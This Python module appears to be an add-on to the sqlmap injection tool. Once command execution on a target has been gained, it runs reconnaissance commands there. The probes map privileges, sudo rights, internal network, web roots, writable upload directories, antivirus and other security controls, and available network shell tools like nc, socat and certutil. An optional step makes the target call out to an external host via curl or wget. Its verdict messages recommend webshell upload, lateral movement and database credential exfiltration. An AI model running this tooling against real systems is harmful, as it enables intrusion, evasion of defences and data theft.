#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission

GhostMap / Yoshi Edition addition
---------------------------------
Pre-OS-shell environment fingerprinting (2026 edition).

Categories of probes:
  1. Identity & privileges - whoami, root/SYSTEM, sudo, groups
  2. Host basics           - hostname, OS version, kernel, uptime
  3. Network position      - internal IP, gateway, DNS, listeners,
                             optional outbound-IP reflector
  4. Web context           - web server process, document root,
                             upload dirs, where the app lives
  5. Defensive posture     - AppArmor/SELinux/auditd; Defender/AV;
                             container vs bare-metal
  6. Filesystem & tools    - writable dirs, presence of curl/wget/python

All probes are read-only. No state is modified, no privileges are
escalated, no defensive software is touched.
"""

from __future__ import print_function


# Public reflector for "what's my outbound IP". Defaults to None so the
# target never reaches out to the internet during the pre-shell probe.
# Set to "ifconfig.me" / "icanhazip.com" / etc. only if your engagement
# explicitly authorizes outbound traffic from the target.
OUTBOUND_IP_REFLECTOR = None


LINUX_TOOL_CHECK = "command -v curl wget python python3 nc ncat socat php perl ruby base64 2>/dev/null"
WINDOWS_TOOL_CHECK = "where curl wget python python3 powershell certutil bitsadmin ncat 2>nul"


LINUX_PROBES = [
    ("user",            "whoami"),
    ("uid_gid",         "id"),
    ("is_root",         "[ \"$(id -u)\" = \"0\" ] && echo YES || echo no"),
    ("sudo_no_pass",    "sudo -n -l 2>&1 | head -3 || echo none"),
    ("groups",          "id -nG 2>/dev/null | tr ' ' ',' | head -1"),

    ("hostname",        "hostname 2>/dev/null || cat /etc/hostname 2>/dev/null"),
    ("kernel",          "uname -srm"),
    ("os_release",      "(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '\"') || echo unknown"),
    ("uptime",          "uptime -p 2>/dev/null || uptime"),
    ("arch",            "uname -m"),

    ("internal_ips",    "(ip -4 addr show 2>/dev/null | grep -oE 'inet [0-9.]+' | awk '{print $2}' | tr '\\n' ',') || (ifconfig 2>/dev/null | grep -oE 'inet [0-9.]+' | awk '{print $2}' | tr '\\n' ',')"),
    ("default_gateway", "(ip route 2>/dev/null | awk '/^default/{print $3; exit}') || (route -n 2>/dev/null | awk '/^0.0.0.0/{print $2; exit}')"),
    ("dns_servers",     "grep -E '^nameserver' /etc/resolv.conf 2>/dev/null | awk '{print $2}' | tr '\\n' ','"),
    ("listeners",       "(ss -tln 2>/dev/null | tail -n +2 | awk '{print $4}' | sort -u | tr '\\n' ',') || (netstat -tln 2>/dev/null | grep LISTEN | awk '{print $4}' | sort -u | tr '\\n' ',')"),

    ("web_proc",        "ps -eo comm,pid 2>/dev/null | grep -E '^(apache2|httpd|nginx|php-fpm|node|gunicorn|uwsgi)' | head -3 | tr '\\n' ';'"),
    ("web_root_apache", "(grep -hE '^\\s*DocumentRoot' /etc/apache2/sites-enabled/*.conf /etc/apache2/sites-available/*.conf /etc/httpd/conf/httpd.conf 2>/dev/null | head -3) || echo n/a"),
    ("web_root_nginx",  "(grep -hE '^\\s*root\\s' /etc/nginx/sites-enabled/* /etc/nginx/conf.d/*.conf 2>/dev/null | head -3) || echo n/a"),
    ("www_writable",    "for d in /var/www /var/www/html /srv/www /usr/share/nginx/html /opt/lampp/htdocs; do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done | head -3"),
    ("uploads_dirs",    "find /var/www /srv/www -maxdepth 3 -type d -iname 'upload*' 2>/dev/null | head -5 | tr '\\n' ';'"),

    ("apparmor",        "[ -d /sys/kernel/security/apparmor ] && echo active || echo absent"),
    ("selinux",         "(command -v getenforce >/dev/null && getenforce) || echo absent"),
    ("auditd",          "pgrep -x auditd >/dev/null && echo running || echo absent"),
    ("fail2ban",        "pgrep -x fail2ban-server >/dev/null && echo running || echo absent"),
    ("container",       "([ -f /.dockerenv ] && echo docker) || ([ -f /run/.containerenv ] && echo podman) || (grep -q 'docker\\|lxc\\|containerd' /proc/1/cgroup 2>/dev/null && echo container) || echo bare-metal-or-unknown"),

    ("writable_tmp",    "for d in /tmp /var/tmp /dev/shm; do [ -w \"$d\" ] && echo \"$d\"; done | tr '\\n' ','"),
    ("home_dirs",       "ls -1 /home 2>/dev/null | head -5 | tr '\\n' ','"),
    ("tools",           LINUX_TOOL_CHECK + " | tr '\\n' ','"),
]


WINDOWS_PROBES = [
    ("user",            "whoami"),
    ("uid_groups",      "whoami /groups | findstr /R \"^BUILTIN ^NT ^Mandatory\""),
    ("is_admin",        "net session >nul 2>&1 && echo YES || echo no"),
    ("integrity",       "whoami /groups | findstr /I \"Mandatory Label\""),
    ("user_privs",      "whoami /priv | findstr /V \"==\\|Privilege Name\\|^$\""),

    ("hostname",        "hostname"),
    ("os_version",      "ver"),
    ("os_detail",       "wmic os get Caption,Version,BuildNumber,OSArchitecture /value 2>nul | findstr \"=\""),
    ("uptime",          "powershell -NoProfile -Command \"(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime\" 2>nul"),
    ("domain",          "echo %USERDOMAIN%"),

    ("internal_ips",    "ipconfig | findstr /I \"IPv4\""),
    ("default_gateway", "ipconfig | findstr /I \"Default Gateway\""),
    ("dns_servers",     "ipconfig /all | findstr /I \"DNS Servers\""),
    ("listeners",       "netstat -an | findstr \"LISTENING\" | findstr /V \"127.0.0.1 ::1\""),

    ("iis_running",     "tasklist /FI \"IMAGENAME eq w3wp.exe\" 2>nul | findstr /I \"w3wp\""),
    ("iis_sites",       "%windir%\\system32\\inetsrv\\appcmd.exe list sites 2>nul"),
    ("iis_apppools",    "%windir%\\system32\\inetsrv\\appcmd.exe list apppools 2>nul"),
    ("iis_phys_paths",  "%windir%\\system32\\inetsrv\\appcmd.exe list vdirs 2>nul"),
    ("xampp_path",      "if exist C:\\xampp\\htdocs (echo C:\\xampp\\htdocs) else (echo n/a)"),
    ("wamp_path",       "if exist C:\\wamp64\\www (echo C:\\wamp64\\www) else if exist C:\\wamp\\www (echo C:\\wamp\\www) else (echo n/a)"),
    ("inetpub",         "if exist C:\\inetpub\\wwwroot (dir /b C:\\inetpub\\wwwroot) else (echo n/a)"),

    ("defender",        "powershell -NoProfile -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AMServiceEnabled | Format-List\" 2>nul"),
    ("av_products",     "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value 2>nul | findstr \"=\""),
    ("firewall",        "netsh advfirewall show currentprofile state 2>nul | findstr /I \"State\""),
    ("uac",             "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>nul | findstr EnableLUA"),

    ("temp_dirs",       "echo %TEMP% & echo %TMP% & echo %PUBLIC%"),
    ("user_profiles",   "dir /b C:\\Users 2>nul"),
    ("tools",           WINDOWS_TOOL_CHECK),
    ("powershell_ver",  "powershell -NoProfile -Command \"$PSVersionTable.PSVersion\" 2>nul"),
]


_SECTION_ORDER = [
    ("Identity & privileges",
        ("user", "uid_gid", "is_root", "sudo_no_pass", "groups",
         "uid_groups", "is_admin", "integrity", "user_privs")),
    ("Host",
        ("hostname", "kernel", "os_release", "os_version", "os_detail",
         "uptime", "arch", "domain")),
    ("Network",
        ("internal_ips", "default_gateway", "dns_servers", "listeners",
         "outbound_ip", "ip_correlation")),
    ("Web context",
        ("web_proc", "web_root_apache", "web_root_nginx", "www_writable",
         "uploads_dirs",
         "iis_running", "iis_sites", "iis_apppools", "iis_phys_paths",
         "xampp_path", "wamp_path", "inetpub")),
    ("Defensive posture",
        ("apparmor", "selinux", "auditd", "fail2ban", "container",
         "defender", "av_products", "firewall", "uac")),
    ("Filesystem & tools",
        ("writable_tmp", "home_dirs", "tools",
         "temp_dirs", "user_profiles", "powershell_ver")),
]


def get_probes(os_label):
    if os_label and os_label.lower().startswith("win"):
        return WINDOWS_PROBES
    return LINUX_PROBES


def _classify_value_color(label, value):
    if not value or str(value).strip() in ("", "n/a", "<e>", "absent"):
        return "\033[01;30m"
    v = str(value).strip().lower()
    if label == "is_root" and "yes" in v:
        return "\033[01;31m"
    if label == "is_admin" and "yes" in v:
        return "\033[01;31m"
    if label == "integrity" and "high" in v:
        return "\033[01;31m"
    if label == "sudo_no_pass" and v not in ("none", "n/a") and "may not run" not in v:
        return "\033[01;31m"
    if label in ("defender", "av_products", "selinux", "apparmor", "auditd"):
        if any(k in v for k in ("running", "enforcing", "true", "enabled", "active")):
            return "\033[01;33m"
        return "\033[01;32m"
    if "writable" in label or label == "www_writable":
        if "writable" in v:
            return "\033[01;33m"
    return "\033[0m"


def _truncate(text, max_len):
    if text is None:
        return "n/a"
    s = str(text).strip()
    if not s:
        return "n/a"
    parts = [ln.strip() for ln in s.splitlines() if ln.strip()]
    if not parts:
        return "n/a"
    head = parts[0]
    if len(parts) > 1:
        head += " \033[01;30m(+%d more)\033[0m" % (len(parts) - 1)
    if len(head) > max_len:
        head = head[:max_len - 3] + "..."
    return head


def format_summary(results, os_label, max_width=110):
    DIM = "\033[01;30m"
    BOLD = "\033[01;37m"
    RESET = "\033[0m"
    CYAN = "\033[01;36m"
    YELLOW = "\033[01;33m"

    by_label = {label: out for (label, out) in results}

    lines = []
    lines.append("")
    lines.append("%s┌─[ %sGhostMap pre-shell environment%s%s ]%s" %
                 (DIM, CYAN, RESET, DIM, RESET))
    lines.append("%s│%s  %sTarget OS:%s %s%s%s" %
                 (DIM, RESET, BOLD, RESET, BOLD, os_label or "unknown", RESET))
    lines.append("%s│%s" % (DIM, RESET))

    for section_title, section_labels in _SECTION_ORDER:
        section_data = [(lbl, by_label.get(lbl)) for lbl in section_labels
                        if lbl in by_label]
        if not section_data:
            continue
        if all((not v or not str(v).strip()) for _, v in section_data):
            continue

        lines.append("%s│%s  %s── %s ──%s" % (DIM, RESET, BOLD, section_title, RESET))
        for lbl, val in section_data:
            display = _truncate(val, max_width - 24)
            color = _classify_value_color(lbl, val)
            lines.append("%s│%s    %-18s %s%s%s" %
                         (DIM, RESET, lbl + ":", color, display, RESET))
        lines.append("%s│%s" % (DIM, RESET))

    lines.append("%s│%s  %sNote:%s these probes are read-only. No system state was modified." %
                 (DIM, RESET, YELLOW, RESET))
    lines.append("%s│%s        Use this output in your engagement report." %
                 (DIM, RESET))
    lines.append("%s└──%s" % (DIM, RESET))
    lines.append("")
    return "\n".join(lines)


def render_report_text(results, os_label):
    """Plain-text (no ANSI) version for transcript / report inclusion."""
    by_label = dict(results)
    lines = []
    lines.append("=" * 72)
    lines.append("GhostMap pre-shell environment")
    lines.append("Target OS: %s" % (os_label or "unknown"))
    lines.append("=" * 72)
    for section_title, section_labels in _SECTION_ORDER:
        section_data = [(lbl, by_label.get(lbl)) for lbl in section_labels
                        if lbl in by_label]
        if not section_data:
            continue
        if all((not v or not str(v).strip()) for _, v in section_data):
            continue
        lines.append("")
        lines.append("[ %s ]" % section_title)
        for lbl, val in section_data:
            text = str(val).strip() if val else "n/a"
            split = text.splitlines() or [text]
            for i, line in enumerate(split):
                prefix = ("  %-18s " % (lbl + ":")) if i == 0 else (" " * 22)
                lines.append(prefix + line)
    lines.append("")
    return "\n".join(lines)


def _resolve_target_host():
    """Resolve the IP of the URL we're attacking, for correlation."""
    try:
        from lib.core.data import conf
        from urllib.parse import urlparse
        url = getattr(conf, "url", "") or ""
        if not url:
            return None, None
        parsed = urlparse(url)
        host = parsed.hostname
        if not host:
            return None, None
        import socket
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = None
        return host, ip
    except Exception:
        return None, None


def correlate_with_target(results):
    """Compare shell-reported IPs with the resolved target URL IP.

    Returns a tuple (label, message). The message goes in the report
    as a hint about whether RCE is on the web tier itself or on
    something behind it.
    """
    host, target_ip = _resolve_target_host()
    if not target_ip:
        return None

    by_label = dict(results)
    shell_ips = by_label.get("internal_ips", "") or ""
    hostname = (by_label.get("hostname", "") or "").strip()

    # Try to find the target IP among the shell-reported IPs
    if target_ip in str(shell_ips):
        return ("ip_correlation",
                "MATCH: target %s (%s) is among shell IPs -> "
                "RCE is on the same host as the web server" %
                (host, target_ip))
    return ("ip_correlation",
            "DIFFERENT: target %s (%s) NOT in shell IPs -> "
            "RCE is on a backend, web server is elsewhere "
            "(possible reverse proxy / load balancer in front)" %
            (host, target_ip))


def run_probes(runCmd_callable, os_label):
    """Execute the probe set against the target.

    `runCmd_callable` returns command output as str (or None).
    Returns: list of (label, output) tuples.
    """
    results = []
    for label, cmd in get_probes(os_label):
        try:
            out = runCmd_callable(cmd)
            results.append((label, out))
        except Exception as ex:
            results.append((label, "<error: %s>" % type(ex).__name__))

    # GhostMap addition: correlate shell IPs with target URL host
    correlation = correlate_with_target(results)
    if correlation:
        results.append(correlation)

    if OUTBOUND_IP_REFLECTOR:
        try:
            if os_label and os_label.lower().startswith("win"):
                cmd = ("powershell -NoProfile -Command "
                       "\"(Invoke-WebRequest -UseBasicParsing -Uri http://%s "
                       "-TimeoutSec 5).Content.Trim()\"" % OUTBOUND_IP_REFLECTOR)
            else:
                cmd = ("(curl -s --max-time 5 http://%s 2>/dev/null) || "
                       "(wget -qO- --timeout=5 http://%s 2>/dev/null) || "
                       "echo n/a") % (OUTBOUND_IP_REFLECTOR, OUTBOUND_IP_REFLECTOR)
            out = runCmd_callable(cmd)
            results.append(("outbound_ip", out))
        except Exception as ex:
            results.append(("outbound_ip", "<error: %s>" % type(ex).__name__))

    return results


# ---------------------------------------------------------------------------
# GhostMap v5 additions: time-based-aware probes
# ---------------------------------------------------------------------------

# Blind-friendly probe set: each probe is engineered to return a SINGLE
# short line. Crucial for time-based blind retrieval where multi-line
# output gets truncated to the first line.
LINUX_PROBES_LITE = [
    ("user",       "whoami"),
    ("hostname",   "hostname"),
    ("os",         "uname -srm"),
    ("internal_ip","hostname -I 2>/dev/null | awk '{print $1}'"),
    ("is_root",    "[ \"$(id -u)\" = \"0\" ] && echo YES || echo no"),
]

WINDOWS_PROBES_LITE = [
    ("user",       "whoami"),
    ("hostname",   "hostname"),
    ("os",         "ver"),
    ("internal_ip","for /f \"tokens=2 delims=:\" %a in ('ipconfig ^| findstr /C:\"IPv4\"') do @echo %a & exit /b"),
    ("is_admin",   "net session 1>nul 2>&1 && echo YES || echo no"),
]


def get_probes_lite(os_label):
    """Return the small blind-friendly probe set."""
    if os_label and os_label.lower().startswith("win"):
        return WINDOWS_PROBES_LITE
    return LINUX_PROBES_LITE


def is_blind_technique():
    """Detect whether the current sqlmap injection is a blind technique
    (time-based or boolean-blind), in which case the heavy probe set
    will be unbearably slow.

    Returns True if blind, False otherwise. Returns False also on
    unknown state (so we don't accidentally skip when it's safe to run).
    """
    try:
        from lib.core.data import kb
        from lib.core.enums import PAYLOAD
        tech = getattr(kb, "technique", None)
        if tech is None:
            return False
        # PAYLOAD.TECHNIQUE.TIME == 4, PAYLOAD.TECHNIQUE.BOOLEAN == 1
        # Use the enum if available.
        try:
            return tech in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.BOOLEAN)
        except Exception:
            # Fall back to numeric comparison
            return tech in (1, 4)
    except Exception:
        return False


def correlate_ip_only(runCmd_callable, os_label):
    """Quick (~1 probe) IP correlation suitable for time-based blind.
    Returns the (label, output) for internal IP plus the correlation
    record (URL host vs URL IP vs Shell IP) as two tuples.

    Use this when you can't afford the full pre-shell fingerprint.
    """
    if os_label and os_label.lower().startswith("win"):
        ip_cmd = ("for /f \"tokens=2 delims=:\" %a in "
                  "('ipconfig ^| findstr /C:\"IPv4\"') do @echo %a & exit /b")
    else:
        ip_cmd = "hostname -I 2>/dev/null | awk '{print $1}'"

    try:
        ip_out = runCmd_callable(ip_cmd)
    except Exception as ex:
        ip_out = "<error: %s>" % type(ex).__name__

    out = [("internal_ip", ip_out)]
    correlation = correlate_with_target(out)
    if correlation:
        out.append(correlation)
    return out


def detect_web_server_location(runCmd_callable, os_label):
    """Identify whether the RCE host is the same machine as the web server.

    Uses 4 cheap signals:
      1. URL IP (resolved from operator's PC) vs shell internal IP
      2. Webroot directory presence
      3. Web server process running on this host
      4. Listening port :80/:443

    Returns dict with the verdict and evidence, or None on failure.
    """
    try:
        from lib.core.data import conf
        import socket
        try:
            from urllib.parse import urlparse
        except ImportError:
            from urlparse import urlparse
    except Exception:
        return None

    is_win = os_label and os_label.lower().startswith("win")

    url_host = url_ip = shell_ip = None
    try:
        if conf.url:
            url_host = urlparse(conf.url).hostname
            if url_host:
                try:
                    url_ip = socket.gethostbyname(url_host)
                except Exception:
                    url_ip = None
    except Exception:
        pass

    if is_win:
        ip_cmd = ("for /f \"tokens=2 delims=:\" %a in "
                  "('ipconfig ^| findstr /C:\"IPv4\"') do @echo %a & exit /b")
        webroot_cmd = ("if exist C:\\inetpub\\wwwroot (dir /b C:\\inetpub\\wwwroot 2>nul "
                       "| findstr /n . | findstr /b \"1:\") else (echo NONE)")
        webproc_cmd = ("tasklist /fi \"imagename eq w3wp.exe\" 2>nul | "
                       "findstr w3wp >nul && echo IIS || (tasklist /fi "
                       "\"imagename eq httpd.exe\" 2>nul | findstr httpd >nul "
                       "&& echo APACHE || echo NONE)")
        listen_cmd = ("netstat -an | findstr LISTENING | findstr \":80 \" >nul "
                      "&& echo YES || echo no")
    else:
        ip_cmd = "hostname -I 2>/dev/null | awk '{print $1}'"
        webroot_cmd = ("(ls -d /var/www/html /srv/www /usr/share/nginx/html "
                       "2>/dev/null | head -1) || echo NONE")
        webproc_cmd = ("pgrep -l 'apache2|nginx|httpd|php-fpm' 2>/dev/null "
                       "| head -1 | awk '{print $2}' || echo NONE")
        listen_cmd = ("ss -tln 2>/dev/null | awk 'NR>1 && $4 ~ /:(80|443)$/ "
                      "{print \"YES\"; exit}' || echo no")

    def _run(c):
        try:
            return (runCmd_callable(c) or "").strip()
        except Exception:
            return ""

    shell_ip = _run(ip_cmd)
    webroot = _run(webroot_cmd)
    webproc = _run(webproc_cmd)
    listening = _run(listen_cmd)

    same_ip = bool(url_ip and shell_ip and (url_ip == shell_ip))
    has_webroot = bool(webroot and webroot != "NONE" and "NONE" not in webroot)
    has_webproc = bool(webproc and webproc != "NONE" and "NONE" not in webproc)
    is_listening = bool(listening and listening.startswith("YES"))

    # Verdict logic:
    # - same_ip: RCE on web server (very likely)
    # - has_webroot + has_webproc: RCE on web server (likely)
    # - none of the above: RCE on backend separated from web tier
    score = sum([same_ip, has_webroot, has_webproc, is_listening])
    if score >= 2:
        verdict = "RCE host LIKELY same as web server"
        implication = ("A webshell uploaded to the webroot would be served. "
                       "Consider documenting webshell upload as the next step.")
    elif score == 0:
        verdict = "RCE host LIKELY DIFFERENT from web server"
        implication = ("Webshell upload to a local path would NOT be directly "
                       "servable. Consider lateral movement, DB credential "
                       "exfiltration, or network mapping.")
    else:
        verdict = "RCE/web colocation UNCLEAR"
        implication = ("Mixed signals -- could be 2-tier with shared FS, or "
                       "atypical deployment. Manual investigation needed.")

    return {
        "url_host":   url_host or "unknown",
        "url_ip":     url_ip or "unresolved",
        "shell_ip":   shell_ip or "unknown",
        "ip_match":   "SAME" if same_ip else ("DIFFERENT" if (url_ip and shell_ip) else "UNKNOWN"),
        "webroot":    webroot or "n/a",
        "webproc":    webproc or "n/a",
        "listening":  "yes" if is_listening else "no",
        "verdict":    verdict,
        "implication": implication,
    }


def format_web_location_panel(info, color=True):
    """Pretty-print web server location detection."""
    if not info:
        return ""
    if color:
        DIM = "\033[01;30m"; BOLD = "\033[01;37m"
        CYAN = "\033[01;36m"; YELLOW = "\033[01;33m"
        GREEN = "\033[01;32m"; RED = "\033[01;31m"; RESET = "\033[0m"
    else:
        DIM = BOLD = CYAN = YELLOW = GREEN = RED = RESET = ""

    match_color = (GREEN if info["ip_match"] == "SAME"
                   else (YELLOW if info["ip_match"] == "DIFFERENT" else DIM))

    lines = []
    lines.append("")
    lines.append("%s+--[ %sWeb server location%s%s ]%s" %
                 (DIM, CYAN, RESET, DIM, RESET))
    lines.append("%s|%s  URL host       %s%s%s" % (DIM, RESET, BOLD, info["url_host"], RESET))
    lines.append("%s|%s  URL IP         %s   %s(resolved from your machine)%s" %
                 (DIM, RESET, info["url_ip"], DIM, RESET))
    lines.append("%s|%s  Shell IP       %s   %s(internal, from RCE)%s" %
                 (DIM, RESET, info["shell_ip"], DIM, RESET))
    lines.append("%s|%s  IP match       %s%s%s" %
                 (DIM, RESET, match_color, info["ip_match"], RESET))
    lines.append("%s|%s" % (DIM, RESET))
    lines.append("%s|%s  Web process    %s" % (DIM, RESET, info["webproc"]))
    lines.append("%s|%s  Webroot        %s" % (DIM, RESET, info["webroot"]))
    lines.append("%s|%s  Listening :80  %s" % (DIM, RESET, info["listening"]))
    lines.append("%s|%s" % (DIM, RESET))
    lines.append("%s|%s  %sVerdict:%s %s%s%s" %
                 (DIM, RESET, BOLD, RESET, YELLOW, info["verdict"], RESET))
    lines.append("%s|%s    %s%s%s" % (DIM, RESET, DIM, info["implication"], RESET))
    lines.append("%s+%s%s" % (DIM, "-" * 70, RESET))
    return "\n".join(lines)
